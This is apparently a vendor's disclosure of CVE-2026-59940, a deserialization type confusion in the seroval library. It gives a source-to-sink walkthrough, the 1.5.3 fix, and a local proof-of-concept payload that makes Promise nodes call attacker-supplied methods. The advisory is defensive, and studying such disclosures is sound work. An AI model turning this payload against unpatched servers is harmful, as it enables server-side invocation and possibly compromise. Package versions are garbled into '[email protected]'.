---
schema_version: "1.0.0"
document_id: "af856e1c6bd2b39f7fe705f54fc4dcdab78d9ea1a89e69e2f01ad80b98fb0474"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/CVE-2026-59940"
published_at: "2026-07-08T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T21:08:44.176891+00:00"
content_hash: "sha256:ce2182f78b7cf75497d1b476bde3524cc60b762c4a3b179b089a8b67664e51e8"
---

# seroval.fromJSON() Promise resolver type confusion invokes attacker-controlled methods (CVE-2026-59940)

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


seroval


Critical


CVE-2026-59940


2026-07-08


# seroval.fromJSON() Promise resolver type confusion invokes attacker-controlled methods (CVE-2026-59940)


## Summary


Promise control nodes trusted attacker-controlled values from Seroval's general deserialization reference table


A type confusion issue in` seroval.fromJSON()` allowed attacker-controlled JSON input to cause` PromiseSuccess` and` PromiseFailure` nodes to operate on values from the general deserialization reference table without first verifying that those values were genuine internal promise resolver records. In vanilla` fromJSON()` mode, the serialized node tree and top-level` m` marked-reference list can place an attacker-created object in that table. The vulnerable handlers retrieved` refs\[node.i\]` and called` .s(...)` or` .f(...)` after checking only that the value was truthy.


With plugins enabled, an attacker could deserialize callable values into the object's` .s` and` .f` properties and make Promise control nodes invoke them with attacker-controlled data during deserialization. This creates a deserialization side-effect primitive. In downstream server frameworks that register plugins returning callable wrappers, it can become unintended server-side invocation and, depending on exposed application functionality, remote code execution or equivalent server compromise.


The issue affects` seroval` versions through` 1.5.2` and was fixed in`[\[email protected\]](https://winfunc.com/cdn-cgi/l/email-protection)` . A concrete downstream impact scenario was privately validated against TanStack Start before the fix; with`[\[email protected\]](https://winfunc.com/cdn-cgi/l/email-protection)` , that reproducer no longer succeeds. The advisory is[GHSA-mv8w-475r-vwqw](https://github.com/lxsmnsyc/seroval/security/advisories/GHSA-mv8w-475r-vwqw) /[CVE-2026-59940](https://www.cve.org/CVERecord?id=CVE-2026-59940) , CWE-502, with CVSS 3.1 score 9.8.


### CVSS Score


Vector


N


Complexity


L


Privileges


N


User Interaction


N


Scope


U


Confidentiality


H


Integrity


H


Availability


H


CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H


### Vulnerability Location


Source


Line 591


packages /seroval


/src


/core


/context


/deserializer.ts


deserializePromiseResolve()


Sink


Line 607


packages /seroval


/src


/core


/context


/deserializer.ts


deserializePromiseReject()


## Source-to-Sink Analysis


1


packages/seroval/src/index.ts:fromJSON()


An application passes attacker-controlled Seroval JSON to` fromJSON()` with one or more deserialization plugins enabled. The payload controls both the serialized node tree and the top-level` m` list of reference IDs that vanilla mode retains.


TYPESCRIPT


```text
const   result =  fromJSON  (payload, {  plugins  : [ CallablePlugin  ] });


```


2


packages/seroval/src/core/context/deserializer.ts:assignIndexedValueVanilla()


When an indexed object ID appears in` m` , vanilla deserialization stores that ordinary attacker-created value in the shared reference table. Ref ID` 0` can therefore hold a plain object whose` .s` and` .f` properties are plugin-produced functions.


TYPESCRIPT


```text
if   (ctx. state  . marked  . has  (id)) {
ctx. base  . refs  . set  (id, value);
}


```


3


packages/seroval/src/core/context/deserializer.ts:deserializePlugin()


A registered plugin may legitimately deserialize a tagged node into a callable wrapper. The proof uses a harmless local plugin that returns functions which only append their arguments to an in-memory array.


TYPESCRIPT


```text
return    assignIndexedValue  (
ctx,
node. i  ,
plugin. deserialize  (node. s  ,  new    DeserializePluginContext  (ctx, depth), {
id  : node. i  ,
}),
);


```


4


packages/seroval/src/core/context/deserializer.ts:deserializePromiseResolve() (before 1.5.3)


The vulnerable Promise success handler retrieved` refs\[node.i\]` and checked only whether the value was truthy. It did not establish that the ref came from Seroval's internal Promise constructor path before calling` .s()` .


TYPESCRIPT


```text
const   deferred = ctx. base  . refs  . get  (node. i  );
if   (deferred) {
deferred. s  ( deserialize  (ctx, depth, node. a  [ 1  ]));
return    NIL  ;
}
throw    new    SerovalMissingInstanceError  ( "Promise"  );


```


5


packages/seroval/src/core/context/deserializer.ts:deserializePromiseReject() (before 1.5.3)


The rejection handler made the same assumption and invoked` .f()` on the attacker-created ref. Both handlers passed a separately deserialized attacker-controlled value as the call argument.


TYPESCRIPT


```text
const   deferred = ctx. base  . refs  . get  (node. i  );
if   (deferred) {
deferred. f  ( deserialize  (ctx, depth, node. a  [ 1  ]));
return    NIL  ;
}
throw    new    SerovalMissingInstanceError  ( "Promise"  );


```


6


packages/seroval/src/core/context/deserializer.ts:validateNodeType() (1.5.3 fix)


The fixed deserializer records the node type associated with an internal Promise constructor ref and validates that provenance before either control node invokes a resolver callback. An ordinary object stored in the general ref table has no matching` PromiseConstructor` type and is rejected first.


TYPESCRIPT


```text
function    validateNodeType  ( ctx, node, id,  type   ) {
if   (ctx. base  . refs  . types  . get  (id) !==  type  ) {
throw    new    SerovalMalformedNodeError  (node);
}
}


validateNodeType  (ctx, node, node. i  ,  SerovalNodeType  . PromiseConstructor  );
deferred. s  ( deserialize  (ctx, depth, node. a  [ 1  ]));


```


## Impact Analysis


### Critical Impact


Direct impact in` seroval` is an attacker-controlled deserialization side effect: structured JSON reconstruction can invoke methods supplied through attacker-created objects. In a downstream framework where a plugin reconstructs RPC, server-function, or other privileged callable wrappers, the same primitive can trigger unintended server-side invocation. Depending on the functions exposed by the application, this may lead to remote code execution or equivalent server compromise. The privately coordinated TanStack Start chain is intentionally summarized without publishing its technical exploit material.


### Attack Surface


Applications that deserialize Seroval JSON from untrusted clients through` fromJSON()` on an affected` seroval` version and enable plugins. The direct package-level primitive requires a plugin capable of reconstructing callable values. Downstream severity depends on what those plugins expose.


### Preconditions


The target must use a vulnerable` seroval` release through` 1.5.2` , accept attacker-controlled Seroval JSON, and register a plugin that can deserialize a function or callable wrapper. Turning the primitive into server compromise additionally requires a downstream callable that reaches privileged server functionality.


## Proof of Concept


### Environment Setup


Create an isolated local project and install the verified vulnerable release:


BASH


```text
mkdir   seroval-type-confusion-poc
cd   seroval-type-confusion-poc
npm init -y >/dev/null
npm pkg  set    type  =module >/dev/null
npm install  [email protected]


```


The proof is local-only: it performs no network requests, shell execution, filesystem writes, or destructive side effects after setup.


### Target Configuration


Save the following as` poc.mjs` . The plugin returns harmless functions that record calls in memory, while the payload marks a normal object containing those functions as ref ID` 0` :


JS


```text
import   assert  from    'node:assert/strict'
import   { createPlugin, fromJSON }  from    'seroval'


const   calls = []
const    CallablePlugin   =  createPlugin  ({
tag  :  '$POC/callable'  ,
test  :  () =>    false  ,
parse  : {  sync  :  () =>   {  throw    new    Error  ( 'unused'  ) } },
serialize  :  () =>   {  throw    new    Error  ( 'unused'  ) },
deserialize  ( node, ctx, data  ) {
const   label = ctx. deserialize  (node. v  )
return    ( arg  ) =>   {
calls. push  ({ label, arg,  pluginNodeId  : data. id   })
return    `called: ${label}  `
}
},
})


const    str   = ( value  ) => ({  t  :  1  ,  s  :  String  (value) })
const    obj   = ( id, entries  ) => ({
t  :  10  ,  i  : id,  o  :  0  ,
p  : {  k  :  Object  . keys  (entries),  v  :  Object  . values  (entries) },
})
const    callable   = ( id, label  ) => ({
t  :  25  ,  i  : id,  c  :  '$POC/callable'  ,  s  : {  v  :  str  (label) },
})


const   payload = {
t  : {  t  :  9  ,  i  :  100  ,  o  :  0  ,  a  : [
obj  ( 0  , {
s  :  callable  ( 1  ,  'success-method'  ),
f  :  callable  ( 2  ,  'failure-method'  ),
}),
{  t  :  23  ,  i  :  0  ,  a  : [
{  t  :  4  ,  i  :  0   },
obj  ( 10  , {  controlled  :  str  ( 'attacker-controlled PromiseSuccess argument'  ) }),
] },
{  t  :  24  ,  i  :  0  ,  a  : [
{  t  :  4  ,  i  :  0   },
obj  ( 11  , {  controlled  :  str  ( 'attacker-controlled PromiseFailure argument'  ) }),
] },
] },
f  :  63  ,
m  : [ 0  ,  1  ,  2  ,  10  ,  11  ,  100  ],
}


```


### Exploit Delivery


Append the invocation and assertions to` poc.mjs` , then execute it:


JS


```text
const   result =  fromJSON  (payload, {  plugins  : [ CallablePlugin  ] })


console  . log  ( 'result:'  ,  Array  . isArray  (result) ?  `Array( ${result.length}  )`   :  typeof   result)
console  . log  ( 'calls:'  ,  JSON  . stringify  (calls,  null  ,  2  ))


assert. equal  (calls. length  ,  2  )
assert. equal  (calls[ 0  ]. label  ,  'success-method'  )
assert. deepEqual  (calls[ 0  ]. arg  , {
controlled  :  'attacker-controlled PromiseSuccess argument'  ,
})
assert. equal  (calls[ 1  ]. label  ,  'failure-method'  )
assert. deepEqual  (calls[ 1  ]. arg  , {
controlled  :  'attacker-controlled PromiseFailure argument'  ,
})


console  . log  ( 'VULNERABLE: attacker-controlled .s/.f methods were invoked'  )


```


BASH


```text
node poc.mjs


```


### Outcome


The proof isolates the root cause: ref ID` 0` contains a normal attacker-created object, not a genuine` PromiseConstructorResolver` , yet the Promise control nodes invoke both of its callable properties. Repeating the regression check with`[\[email protected\]](https://winfunc.com/cdn-cgi/l/email-protection)` aborts deserialization before either in-memory side effect occurs. The separately coordinated TanStack Start reproducer likewise produces no evidence side effect with` 1.5.3` .


**Expected Response:** On`[\[email protected\]](https://winfunc.com/cdn-cgi/l/email-protection)` ,` fromJSON()` returns an array and records two calls during deserialization: one to the attacker-created` .s` value with the PromiseSuccess argument, and one to` .f` with the PromiseFailure argument. The final line is:


TEXT


```text
VULNERABLE: attacker-controlled .s/.f methods were invoked


```


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/lxsmnsyc/seroval/security/advisories/GHSA-mv8w-475r-vwqw)
